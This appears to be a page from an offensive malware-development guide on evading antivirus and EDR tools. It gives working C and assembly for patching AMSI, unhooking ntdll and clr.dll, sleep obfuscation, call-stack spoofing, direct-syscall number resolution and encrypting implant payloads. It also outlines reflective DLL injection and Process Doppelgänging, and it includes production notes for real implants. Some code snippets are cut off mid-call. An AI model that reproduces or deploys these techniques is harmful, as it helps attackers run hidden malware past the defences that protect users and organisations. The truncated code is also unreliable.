AMSI — patch AmsiScanBuffer with xor eax,eax; ret✓ 4C 8B DC 49 → 31 C0 C3 49

AmsiScanBuffer returns AMSI_RESULT in eax. Patching its prologue with 31 C0 C3 makes every call return 0 (AMSI_RESULT_CLEAN) before any scanning logic runs.

Layer 2b

Manual NTDLL unhooking

EDRs hook Nt* stubs by overwriting their first bytes with a JMP to the driver's analysis routine. The counter: map a fresh ntdll.dll from disk with SEC_IMAGE (so section RVAs align with the live image), locate the .text section, and overwrite the in-memory copy with one memcpy — removing all hooks simultaneously.

SEC_IMAGE map → locate .text → VirtualProtect PAGE_EXECUTE_WRITECOPY → memcpy✓ 0x119200 bytes restored

    FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMap = CreateFileMappingW(hFile, NULL,
    PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);   // SEC_IMAGE aligns RVAs
LPVOID pFresh = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);

// Walk PE sections, find ".text"
// pTarget = in-memory ntdll + sec[i].VirtualAddress
// pSource = fresh map    + sec[i].VirtualAddress

memcpy(pTarget, pSource, size);   // ← unhooks all Nt* stubs at once
VirtualProtect(pTarget, size, oldProt, &oldProt);

Layer 2c

Ekko-style sleep obfuscation

The Ekko technique (published by 5pider) makes an implant invisible to memory scanners while it sleeps by encrypting its own code region and flipping it to PAGE_NOACCESS before yielding the CPU. Any scanner that walks the process's memory during the sleep reads only garbage in an inaccessible page.

The production implementation uses timer-queue APCs and RtlCaptureContext/RtlRestoreContext so the encryption/decryption happens atomically without the main thread needing to run. Our PoC demonstrates the core primitive on a standalone RWX buffer.

Production notes In a real implant: (1) the buffer is the running shellcode/PE image; (2) the XOR key rotates per sleep; (3) AES-128/256 replaces XOR for stronger obfuscation; (4) the timer callback approach means the sleeping thread never touches the encrypted region itself.
XOR-encrypt → PAGE_NOACCESS → Sleep → restore → XOR-decrypt → verify✓ 4096-byte round-trip verified
C
BOOL Evade_EkkoSleep(DWORD sleepMs) {
    const SIZE_T BUF_SIZE = 4096;
    const BYTE   XOR_KEY  = 0xAB;

    // Simulated shellcode/implant region (RWX)
    BYTE* buf = (BYTE*)VirtualAlloc(NULL, BUF_SIZE,
                    MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    for (SIZE_T i=0; i<BUF_SIZE; i++) buf[i] = (BYTE)(i&0xFF);  // known pattern

    // Encrypt
    for (SIZE_T i=0; i<BUF_SIZE; i++) buf[i] ^= XOR_KEY;

    // Go dark: PAGE_NOACCESS — scanner sees only a non-readable garbled page
    DWORD oldProt;
    VirtualProtect(buf, BUF_SIZE, PAGE_NOACCESS, &oldProt);
    Sleep(sleepMs);

    // Wake: restore protection, decrypt, verify
    VirtualProtect(buf, BUF_SIZE, oldProt, &oldProt);
    for (SIZE_T i=0; i<BUF_SIZE; i++) buf[i] ^= XOR_KEY;

    BOOL ok = TRUE;
    for (SIZE_T i=0; i<BUF_SIZE; i++)
        if (buf[i] != (BYTE)(i&0xFF)) { ok=FALSE; break; }

    VirtualFree(buf, 0, MEM_RELEASE);
    return ok;
}

Layer 2d

PAGE_GUARD scanning

The PAGE_GUARD protection flag causes an access violation on the first access to a page, then clears itself. Debuggers and some EDRs use this as a breakpoint mechanism. Walking the process's virtual address space with VirtualQuery and checking for the flag reveals these watchpoints without triggering them.

VirtualQuery scan for PAGE_GUARD flag across full address space⚠ 3 regions found (thread stack guards)
C
MEMORY_BASIC_INFORMATION mbi;
ULONG_PTR addr = 0;
DWORD guardCount = 0;

while (VirtualQuery((LPCVOID)addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
    if (mbi.Protect & PAGE_GUARD) {
        guardCount++;
        // log base address, size, state, type
    }
    if (mbi.RegionSize == 0) break;
    ULONG_PTR next = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
    if (next <= addr) break;   // address wrapped
    addr = next;
}
Live output
[INFO] PAGE_GUARD @ 0x0000007980709000  size=0x3000  state=0x1000  type=0x20000
[INFO] PAGE_GUARD @ 0x0000007980AFC000  size=0x3000  state=0x1000  type=0x20000
[INFO] PAGE_GUARD @ 0x0000007980BFB000  size=0x3000  state=0x1000  type=0x20000
[INFO] Scan complete: 3 PAGE_GUARD region(s)
Why three regions on a clean process? state=0x1000 (MEM_COMMIT) and type=0x20000 (MEM_PRIVATE) at stack-boundary addresses are normal Windows thread stack guard pages. Every thread gets guard pages at the low end of its stack to detect overflow. These are not EDR watchpoints. In a real deployment, an implant would filter these out (e.g., only flag guard pages that sit inside loaded module ranges or PE image regions) rather than treating all guard pages as hostile.

Layer 2f · Concept

Call stack spoofing

Modern EDRs walk the call stack of any suspicious thread (e.g., a thread that called NtAllocateVirtualMemory) to see which module issued the call. If the return address on the stack points into an anonymous RWX region, that is an immediate red flag. Call stack spoofing inserts a believable fake return chain to make the call look like it originated from a trusted module.

Mechanism — return address override via trampoline gadget

The core primitive is a trampoline gadget: a small stub in a legitimate module (or a hand-crafted ROP stub in a RW region) that performs add rsp, N; jmp [rbx]. Before invoking the syscall:

1. Push a fake return address that points into a trusted DLL (ntdll!LdrInitializeThunk, kernel32!BaseThreadInitThunk, etc.).
2. Set up additional fake frames on the stack as needed by the EDR's stack depth.
3. Issue the syscall stub by calling through the trampoline instead of directly — the CPU's return prediction sees the spoofed chain.

A complete implementation requires knowing the exact stack frame layout expected by the target EDR, and is highly version-specific. The technique is fundamentally a crafted ROP chain whose job is deception rather than code execution.

asm · conceptual trampoline stub (MASM)
; GadgetTrampoline PROC
;   rbx = real syscall stub address
;   [rsp] = fake return address (planted by caller)
add rsp, 8          ; skip over the spoofed frame entry
jmp QWORD PTR [rbx]  ; jump to actual Nt* stub
; GadgetTrampoline ENDP

; Caller sets up:
;   push [RetAddrInKernel32]   ← fake "caller" seen by stack walker
;   push [RetAddrInNtdll]      ← second fake frame
;   lea  rbx, NtAllocVirtMem_stub
;   call GadgetTrampoline
Layer 2g · Concept

CLR unhooking

When a .NET payload runs inside a host process that has the Common Language Runtime loaded, EDRs hook methods in clr.dll in addition to ntdll.dll. The unhooking approach is identical to the NTDLL technique: map a fresh copy of clr.dll from disk, locate its .text section, and overwrite the live image.

Implementation outline

Replace "ntdll.dll" with "clr.dll" in the NTDLL unhook function and call it after verifying that the CLR is loaded (GetModuleHandleA("clr.dll") != NULL). The same SEC_IMAGE mapping technique applies because clr.dll is a standard PE image.

The relevant CLR functions that EDRs frequently hook include CLRCreateInstance, ICorRuntimeHost::CreateDomain, and JIT-compilation callbacks. Restoring the entire .text section removes all of them at once.

Layer 2h

Hell's Gate & Tartarus Gate — SSN resolution

Even with ntdll unhooked, calls through the import table are auditable. Direct syscalls bypass userland dispatch by finding the System Service Number (SSN) and issuing a raw syscall instruction. Hell's Gate reads the SSN when the stub is clean. Tartarus Gate infers it from a neighbouring clean stub when the target is hooked.

Walk PE export table, detect stub pattern 4C 8B D1 B8, extract SSN from bytes 4–5✓ 10/10 resolved
C
// Hell's Gate: stub is clean
if (stub[0]==0x4C && stub[1]==0x8B && stub[2]==0xD1 && stub[3]==0xB8) {
    *outSSN = *(WORD*)(stub + 4);   // bytes 4-5 = SSN
    return TRUE;
}
// Tartarus Gate: stub hooked, infer from ±delta neighbours
for (DWORD d=1; d<=32; d++) {
    BYTE* above = hNtdll + funcs[ordinals[idx-d]];
    if (IsCleanStub(above)) { *outSSN = *(WORD*)(above+4) + d; return TRUE; }
    BYTE* below = hNtdll + funcs[ordinals[idx+d]];
    if (IsCleanStub(below)) { *outSSN = *(WORD*)(below+4) - d; return TRUE; }
}

Layer 3c · Concept

Reflective DLL injection

A Reflective DLL is a DLL that contains its own mini-loader in a function called ReflectiveLoader. When injected into a remote process as raw bytes (no LoadLibrary), the caller jumps directly to ReflectiveLoader, which then:

Loader sequence (runs entirely from within the injected buffer)

1. Find kernel32.dll base by walking PEB.InMemoryOrderModuleList.

2. Resolve LoadLibraryA, GetProcAddress, VirtualAlloc from kernel32 export table.

3. Allocate a new region large enough for the DLL's virtual size.

4. Copy the PE header and each section into place.

5. Process the base relocation table (adjust pointers for the new base address).

6. Walk the import directory and resolve each import using LoadLibraryA + GetProcAddress.

7. Call DllMain(DLL_PROCESS_ATTACH).

The result: a fully functional DLL in memory that never appeared in LoadLibrary call records and has no entry in the PEB.InMemoryOrderModuleList.

Layer 3d · Concept

Process Doppelgänging

Process Doppelgänging (Tal Liberman & Eugene Kogan, BlackHat 2017) abuses NTFS Transactional File System (TxF) to create a process from a payload that never exists as a real file on disk.

Mechanism

1. Transact — Open a TxF transaction (NtCreateTransaction). Within the transaction, overwrite a legitimate system file (e.g., calc.exe) with the malicious payload using NtCreateFile + NtWriteFile.

2. Load — Call NtCreateSection(SEC_IMAGE) on the transacted file handle. The kernel creates a section backed by the malicious content, because from the kernel's view the transaction has committed (locally).

3. Rollback — Roll back the transaction (NtRollbackTransaction). The file on disk reverts to the original; the section object retains the malicious content.

4. Execute — Create a process from the section, set up PEB, initial thread, and stack, then resume. The resulting process has a legitimate-looking image path but runs the malicious payload.

Note: TxF is deprecated in Windows 10 1709+ and is increasingly blocked or monitored by EDRs. Modern Windows also may reject SEC_IMAGE creation on transacted files in certain configurations.

Layer 4a

AES-256-GCM via Windows BCrypt

AES-256-GCM is the standard choice for implant payload encryption: 256-bit key gives 128-bit security against brute force, and GCM's authentication tag provides integrity — any tampering with the ciphertext causes BCryptDecrypt to return STATUS_AUTH_TAG_MISMATCH, so a corrupted or injected payload is rejected before executing.

BCryptOpenAlgorithmProvider(AES) → BCRYPT_CHAIN_MODE_GCM → encrypt → decrypt → verify tag✓ GCM tag authenticated
C
BCRYPT_ALG_HANDLE hAlg; BCRYPT_KEY_HANDLE hKey;
BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
    (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj, keyObjLen, key, 32, 0);

// Encrypt with GCM auth info (96-bit nonce, 128-bit tag)
BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
BCRYPT_INIT_AUTH_MODE_INFO(ai);
ai.pbNonce = iv; ai.cbNonce = 12;
ai.pbTag   = authTag; ai.cbTag = 16;

    ciphertext, sizeof(ciphertext), &cbCT, 0);

// Decrypt — returns STATUS_AUTH_TAG_MISMATCH if tag fails

Layer 4b

Environment-bound key derivation — PBKDF2-SHA256

An implant that hardcodes its decryption key is vulnerable to static analysis — extract the key, decrypt the payload. The counter: derive the key at runtime from machine-specific values. Only on the intended target do the inputs exist to produce the correct key.

BCryptDeriveKeyPBKDF2 — HMAC-SHA256 · 100,000 iterations · environment inputs✓ Key: A6A27B8D 33FC1150...

The password is assembled at runtime from environment-specific values. The salt is a fixed per-campaign value embedded in the loader. 100,000 PBKDF2 iterations cost ~100 ms on modern hardware, adding meaningful cost to offline bruteforce even if the salt is known.

C
// Production: password assembled from live environment
// e.g. sprintf(password, "%s|%s|%08lX",
//              computerName, userName, volumeSerial);
static const BYTE password[] = "env:MAC=00:1A:2B:3C:4D:5E,VOL=DEADBEEF";
static const BYTE salt[16]   = { 0xDE,0xAD, ... };

BCRYPT_ALG_HANDLE hAlg;
BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL,
    BCRYPT_ALG_HANDLE_HMAC_FLAG);

BCryptDeriveKeyPBKDF2(hAlg,
    (PBYTE)password, sizeof(password)-1,
    (PBYTE)salt,     sizeof(salt),
    100000ULL,       // 100k iterations
